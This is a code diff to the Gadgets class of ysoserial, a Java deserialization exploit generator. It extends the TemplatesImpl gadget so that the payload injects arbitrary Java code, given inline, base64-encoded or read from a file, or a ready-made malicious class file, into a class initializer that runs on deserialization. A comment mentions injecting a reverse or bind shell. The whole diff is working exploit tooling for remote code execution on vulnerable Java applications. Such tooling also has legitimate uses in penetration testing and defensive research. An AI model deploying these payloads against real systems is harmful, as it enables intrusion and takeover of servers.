@@ -3,12 +3,16 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.net.URLDecoder;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,6 +28,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import sun.misc.BASE64Decoder;
 
 
 /*
@@ -112,24 +117,49 @@ public class Gadgets {
         pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
         pool.insertClassPath(new ClassClassPath(abstTranslet));
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
+        byte[] classBytes = null;
+        String cmd = "";
+        if (command.startsWith("code:")){
+            cmd = command.substring(5);
+        } else if (command.startsWith("codebase64:")){
+            byte[] decode = new BASE64Decoder().decodeBuffer(command.substring(11));
+            cmd = new String(decode);
+        } else if (command.startsWith("codefile:")){
+            String codefile = command.substring(9);
+            cmd = CommonUtils.getCodeFile(codefile);
+        // 指定了 class文件之后 直接读取字节码
+        } else if (command.startsWith("classfile:")){
+            String classfile = command.substring(10);
+            classBytes = CommonUtils.readClassByte(classfile);
+            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
+            Reflections.setFieldValue(templates, "_name", "Pwnr");
+//            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+            return templates;
+        } else {
+            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+        }
+        // 插入我们自己的代码
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
-
-        final byte[] classBytes = clazz.toBytecode();
-
-        // inject class bytes into instance
+//        // run command in static initializer
+//        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+//        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+//            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+//            "\");";
+//        clazz.makeClassInitializer().insertAfter(cmd);
+//        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+//        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+//        CtClass superC = pool.get(abstTranslet.getName());
+//        clazz.setSuperclass(superC);
+        classBytes = clazz.toBytecode();
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
             classBytes, ClassFiles.classAsBytes(Foo.class)
         });
-
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "Pwnr");
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
